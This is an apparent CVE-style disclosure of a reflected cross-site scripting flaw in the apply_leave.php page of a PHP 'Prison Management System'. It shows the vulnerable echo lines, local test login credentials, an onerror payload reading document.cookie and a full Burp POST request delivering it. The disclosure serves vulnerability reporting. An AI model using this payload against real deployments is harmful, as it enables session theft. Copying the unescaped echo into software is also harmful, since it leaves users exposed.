# Prison Management System
## XSS on `/Employee/apply_leave.php`

### Vendor Homepage:

```
https://www.sourcecodester.com/sql/17287/prison-management-system.html
```

### Version:

```
V1.0
```

### Tested on:

```
PHP, Apache, MySQL
```

### Credentials:

```
http://127.0.0.1/prison/Account/login.php
releaseme@gmail.com
escobar2012
```

### Affected Page:

```
/Employee/apply_leave.php
```

The parameter `txtstart_date` and `txtend_date` are being echoed directly into the HTML without proper sanitization or validation. This allows an attacker to inject arbitrary JavaScript code into the page, leading to XSS attacks.

```jsx
169: <?php if (isset($_POST['txtstart_date']))?><?php echo $_POST['txtstart_date']; ?>

173: <?php if (isset($_POST['txtend_date']))?><?php echo $_POST['txtend_date']; ?>
```

### Proof of Concept:

Payload:

```jsx
"><img+src%3d1+onerror%3dalert(document.cookie)>
```

Burp Request:

```jsx
POST /prison/Employee/apply_leave.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/prison/Employee/apply_leave.php
Cookie: PHPSESSID=s12tp6ej1l5r65iapelk58b1lg
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

txtstart_date=2000-01-01"><img+src%3d1+onerror%3dalert(document.cookie)>&txtend_date=2000-01-03&cmdreason=Study+Leave&btnapply=
```

### Screenshot

![image](https://github.com/zyairelai/CVE-submissions/assets/49854907/40ffd010-497c-4d1c-a83e-edf3a248f503)
